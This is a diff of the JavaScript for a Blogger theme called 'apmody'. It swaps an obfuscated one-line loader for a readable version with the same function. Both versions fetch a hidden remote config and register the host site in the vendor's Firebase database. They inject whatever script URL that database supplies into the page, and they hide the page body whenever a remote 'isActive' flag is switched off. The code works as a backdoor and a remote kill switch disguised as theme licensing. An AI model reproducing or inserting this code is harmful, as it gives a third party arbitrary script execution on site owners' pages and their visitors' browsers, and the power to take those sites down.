@@ -1,1 +1,110 @@
-const THEME_NAME="apmody",b="aHR0cHM6Ly9jZG5peC5wYWdlcy5kZXYvdGhlbWUvY29uZmlnLmpzb24=",c=atob(b);let f={},J="",C="";function w(u){return u.replace(/\./g,"_")}function I(){try{return firebase.apps.length?firebase.database():(firebase.initializeApp(f),firebase.database())}catch{return document.body.style.display="none",null}}async function L(d,u){try{const r=d.ref(`themes/${THEME_NAME}/websites/${u}/jsUrl`),s=await r.get();if(s.exists()&&s.val()){const e=document.createElement("script");e.src=s.val(),e.async=!0,e.onerror=()=>{},document.head.appendChild(e)}}catch{}}async function S(d,u){try{const r=d.ref(`themes/${THEME_NAME}/websites/${u}/cssUrl`),s=await r.get();if(s.exists()&&s.val()){const e=document.createElement("link");e.rel="stylesheet",e.href=s.val(),document.head.appendChild(e)}}catch{}}async function R(){const d=I();if(!d)return;const h=window.location.hostname,k=w(h),r=d.ref(`themes/${THEME_NAME}/websites/${k}`);try{(await r.get()).exists()||(await r.set({url:h,isActive:!0,registeredAt:new Date().toISOString(),jsUrl:J,cssUrl:C}),document.body.style.display="block"),await L(d,k),await S(d,k),r.on("value",e=>{const v=e.val();v&&v.isActive?document.body.style.display="block":document.body.style.display="none"})}catch{document.body.style.display="none"}}async function start(){try{const j=await fetch(c),x=await j.json();f=x.firebaseConfig,J=x.defaultJsUrl,C=x.defaultCssUrl,R()}catch{document.body.style.display="none"}}document.addEventListener("DOMContentLoaded",()=>{document.body.style.display="none",start()});
+const THEME_NAME = "apmody";
+const CONFIG_URL_B64 = "PASTE_BASE64_CONFIG_URL_HERE";
+const CONFIG_URL = atob(CONFIG_URL_B64);
+
+let firebaseConfig = null;
+let defaults = { js: "", css: "", theme: THEME_NAME };
+
+const norm = (host) => host.replace(/\./g, "_");
+
+function injectJS(url) {
+  if (!url) return;
+  const s = document.createElement("script");
+  s.src = url;
+  s.async = true;
+  s.onerror = () => {};
+  document.head.appendChild(s);
+}
+
+function injectCSS(url) {
+  if (!url) return;
+  const l = document.createElement("link");
+  l.rel = "stylesheet";
+  l.href = url;
+  document.head.appendChild(l);
+}
+
+function initDB(cfg) {
+  try {
+    if (!cfg || !cfg.apiKey) return null;
+    if (window.firebase && window.firebase.apps && window.firebase.apps.length) return firebase.database();
+    firebase.initializeApp(cfg);
+    return firebase.database();
+  } catch (e) {
+    console.error("Firebase init failed", e);
+    return null;
+  }
+}
+
+async function start() {
+  try {
+    const r = await fetch(CONFIG_URL);
+    const conf = await r.json();
+
+    firebaseConfig = conf.firebaseConfig || null;
+    defaults = {
+      js: conf.defaultJsUrl,
+      css: conf.defaultCssUrl,
+      theme: conf.themeName || THEME_NAME
+    };
+
+    if (!firebaseConfig || !firebaseConfig.apiKey) {
+      console.warn("No firebaseConfig; loading defaults.");
+      injectCSS(defaults.css);
+      injectJS(defaults.js);
+      document.body.style.display = "block";
+      return;
+    }
+
+    const db = initDB(firebaseConfig);
+    if (!db) {
+      injectCSS(defaults.css);
+      injectJS(defaults.js);
+      document.body.style.display = "block";
+      return;
+    }
+
+    const host = window.location.hostname;
+    const key = norm(host);
+    const ref = db.ref(`themes/${defaults.theme}/websites/${key}`);
+
+    const snap = await ref.get();
+    if (snap.exists()) {
+      const data = snap.val();
+      injectCSS(data.cssUrl || defaults.css);
+      injectJS(data.jsUrl || defaults.js);
+
+      console.groupCollapsed("%cValid License", "color:#57956A;font-size:12px");
+      console.groupCollapsed("License for");
+      console.log("ID : " + (data.id || ""));
+      console.log("Domain : " + (data.url || host));
+      console.log("Owner : " + (data.owner || ""));
+      console.log("Type : " + (data.type || "Premium"));
+      console.groupEnd();
+      console.group((data.ttl || "APMODY") + " - Blogger templates");
+      console.log("Demo : " + (data.demo || "https://example.com/"));
+      console.groupEnd();
+      console.groupEnd();
+
+      ref.on("value", s2 => {
+        const v = s2.val();
+        document.body.style.display = v && v.isActive ? "block" : "none";
+      });
+      document.body.style.display = data.isActive === false ? "none" : "block";
+
+    } else {
+      console.warn("Unlicensed domain. Loading defaults.");
+      injectCSS(defaults.css);
+      injectJS(defaults.js);
+      document.body.style.display = "block";
+    }
+  } catch (e) {
+    console.error(e);
+    document.body.style.display = "block";
+  }
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  document.body.style.display = "none";
+  start();
+});
